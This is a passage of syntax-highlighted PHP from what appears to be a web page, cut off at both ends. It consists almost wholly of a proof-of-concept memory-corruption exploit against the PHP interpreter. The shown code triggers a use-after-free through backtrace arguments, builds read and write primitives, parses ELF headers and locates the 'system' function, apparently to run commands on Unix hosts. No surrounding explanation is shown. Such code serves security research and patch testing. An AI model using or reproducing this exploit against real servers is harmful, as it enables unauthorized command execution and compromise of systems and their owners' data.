<span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">Exception</span><span class=\"token punctuation\">)</span><span class=\"token operator\">-></span><span class=\"token function\">getTrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$backtrace</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'args'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token variable\">$backtrace</span> <span class=\"token operator\">=</span> <span class=\"token function\">debug_backtrace</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">Helper</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">public</span> <span class=\"token variable\">$a</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$b</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$c</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$d</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">str2ptr</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$p</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$s</span> <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$address</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$j</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$s</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$j</span> <span class=\"token operator\">>=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$j</span><span class=\"token operator\">--</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$address</span> <span class=\"token operator\">&lt;&lt;</span><span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$address</span> <span class=\"token operator\">|=</span> <span class=\"token function\">ord</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$p</span><span class=\"token operator\">+</span><span class=\"token variable\">$j</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$address</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">ptr2str</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ptr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$m</span> <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$out</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$m</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$out</span> <span class=\"token operator\">.=</span> <span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"%c\"</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$ptr</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$ptr</span> <span class=\"token operator\">>></span><span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$out</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">write</span><span class=\"token punctuation\">(</span><span class=\"token operator\">&amp;</span><span class=\"token variable\">$str</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$p</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$v</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$n</span> <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$n</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$str</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$p</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">sprintf</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"%c\"</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$v</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xff</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$v</span> <span class=\"token operator\">>></span><span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$addr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$p</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$s</span> <span class=\"token operator\">=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">global</span> <span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$helper</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$addr</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$p</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$leak</span> <span class=\"token operator\">=</span> <span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$helper</span><span class=\"token operator\">-></span><span class=\"token property\">a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span> <span class=\"token operator\">!=</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token variable\">$leak</span> <span class=\"token operator\">%=</span> <span class=\"token number\">2</span> <span class=\"token operator\">&lt;&lt;</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$s</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token variable\">$leak</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">parse_elf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$e_type</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token variable\">$e_phoff</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$e_phentsize</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x36</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$e_phnum</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$e_phnum</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$header</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$base</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$e_phoff</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">*</span> <span class=\"token variable\">$e_phentsize</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$p_type</span>  <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$header</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$p_flags</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$header</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$p_vaddr</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$header</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$p_memsz</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$header</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x28</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$p_type</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$p_flags</span> <span class=\"token operator\">==</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> \n\n                <span class=\"token variable\">$data_addr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$e_type</span> <span class=\"token operator\">==</span> <span class=\"token number\">2</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$p_vaddr</span> <span class=\"token punctuation\">:</span> <span class=\"token variable\">$base</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$p_vaddr</span><span class=\"token punctuation\">;</span>\n                <span class=\"token variable\">$data_size</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$p_memsz</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$p_type</span> <span class=\"token operator\">==</span> <span class=\"token number\">1</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$p_flags</span> <span class=\"token operator\">==</span> <span class=\"token number\">5</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> \n                <span class=\"token variable\">$text_size</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$p_memsz</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token operator\">!</span><span class=\"token variable\">$data_addr</span> <span class=\"token operator\">||</span> <span class=\"token operator\">!</span><span class=\"token variable\">$text_size</span> <span class=\"token operator\">||</span> <span class=\"token operator\">!</span><span class=\"token variable\">$data_size</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token keyword\">return</span> <span class=\"token punctuation\">[</span><span class=\"token variable\">$data_addr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$text_size</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$data_size</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">get_basic_funcs</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$base</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$elf</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">list</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data_addr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$text_size</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$data_size</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$elf</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$data_size</span> <span class=\"token operator\">/</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$leak</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data_addr</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leak</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$base</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$leak</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$base</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$data_addr</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$base</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token variable\">$deref</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leak</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                \n                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$deref</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0x746e6174736e6f63</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span>\n\n            <span class=\"token variable\">$leak</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$data_addr</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">+</span> <span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leak</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$base</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token variable\">$leak</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$base</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$data_addr</span> <span class=\"token operator\">-</span> <span class=\"token variable\">$base</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token variable\">$deref</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leak</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                \n                <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$deref</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0x786568326e6962</span><span class=\"token punctuation\">)</span>\n                    <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token keyword\">continue</span><span class=\"token punctuation\">;</span>\n\n            <span class=\"token keyword\">return</span> <span class=\"token variable\">$data_addr</span> <span class=\"token operator\">+</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">get_binary_base</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$binary_leak</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$base</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$start</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$binary_leak</span> <span class=\"token operator\">&amp;</span> <span class=\"token number\">0xfffffffffffff000</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token number\">0x1000</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$addr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$start</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x1000</span> <span class=\"token operator\">*</span> <span class=\"token variable\">$i</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$leak</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$addr</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$leak</span> <span class=\"token operator\">==</span> <span class=\"token number\">0x10102464c457f</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">return</span> <span class=\"token variable\">$addr</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">get_system</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$basic_funcs</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$addr</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$basic_funcs</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">do</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token variable\">$f_entry</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$addr</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token variable\">$f_name</span> <span class=\"token operator\">=</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f_entry</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f_name</span> <span class=\"token operator\">==</span> <span class=\"token number\">0x6d6574737973</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">return</span> <span class=\"token function\">leak</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$addr</span> <span class=\"token operator\">+</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n            <span class=\"token variable\">$addr</span> <span class=\"token operator\">+=</span> <span class=\"token number\">0x20</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">while</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$f_entry</span> <span class=\"token operator\">!=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">trigger_uaf</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$arg</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n\n        <span class=\"token variable\">$arg</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_shuffle</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$vuln</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Vuln</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$vuln</span><span class=\"token operator\">-></span><span class=\"token property\">a</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$arg</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">stristr</span><span class=\"token punctuation\">(</span><span class=\"token constant\">PHP_OS</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'WIN'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'This PoC is for *nix systems only.'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token variable\">$n_alloc</span> <span class=\"token operator\">=</span> <span class=\"token number\">10</span><span class=\"token punctuation\">;</span> \n    <span class=\"token variable\">$contiguous</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$i</span> <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span> <span class=\"token operator\">&lt;</span> <span class=\"token variable\">$n_alloc</span><span class=\"token punctuation\">;</span> <span class=\"token variable\">$i</span><span class=\"token operator\">++</span><span class=\"token punctuation\">)</span>\n        <span class=\"token variable\">$contiguous</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token function\">str_shuffle</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">trigger_uaf</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'x'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$abc</span> <span class=\"token operator\">=</span> <span class=\"token variable\">$backtrace</span><span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'args'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token number\">0</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token variable\">$helper</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Helper</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$helper</span><span class=\"token operator\">-></span><span class=\"token property\">b</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$x</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span> <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">79</span> <span class=\"token operator\">||</span> <span class=\"token class-name\">strlen</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">die</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"UAF failed\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token variable\">$closure_handlers</span> <span class=\"token operator\">=</span> <span class=\"token function\">str2ptr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$php_heap</span> <span class=\"token operator\">=</span> <span class=\"token function\">str2ptr</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$abc</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x58</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span 